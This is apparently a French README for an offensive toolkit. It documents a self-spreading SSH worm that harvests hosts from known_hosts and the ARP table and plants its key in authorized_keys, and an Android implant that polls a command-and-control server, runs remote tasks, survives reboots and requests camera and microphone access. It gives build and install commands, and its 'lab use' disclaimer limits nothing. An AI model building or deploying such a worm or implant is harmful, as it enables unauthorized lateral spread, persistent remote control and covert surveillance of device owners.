# TASK FORCE X — powered by Maxime Leal

Les missions de déploiement : worm SSH Unix, module Android. Usage lab/appareils autorisés.

## 1 — SSH WORM (`taskforce_ssh_worm.py`)
**Quoi** : collecte les cibles (`~/.ssh/known_hosts` + table ARP), teste le port 22, tente les clés locales (BatchMode), injecte sa clé publique dans `authorized_keys` de chaque cible — l'accès par clé ne demande plus jamais de mot de passe.
**Usage** : `python3 taskforce_ssh_worm.py [user]` — prérequis : une clé `~/.ssh/id_rsa.pub` + cibles qui acceptent ta clé (ton propre lab).
**Sortie** : liste des machines infectées.

## 2 — MODULE ANDROID (`apk/`)
**Quoi** : LexService — service Android de check-in C2 : toutes les 10-15 s, requête HTTP au C2, exécution de la tâche, renvoi du résultat. `START_STICKY` (relancé par le système si tué) + `BootReceiver` (relancé au démarrage du téléphone).
**Fichiers** : `AndroidManifest.xml` (permissions Internet/Boot/Camera/Micro), `LexService.java`, `BootReceiver.java`, `build_apk.sh`.
**IP à régler avant build** : variable `c2` dans `LexService.java`.
**Build** : `zsh apk/build_apk.sh` — nécessite Android SDK :
```
brew install --cask android-commandlinetools openjdk
sdkmanager "platforms;android-33" "build-tools;33.0.2"
```
**Install lab** : `adb install lex.apk` sur ton appareil de test, permission « installation d'inconnues » activée, le service part au boot.
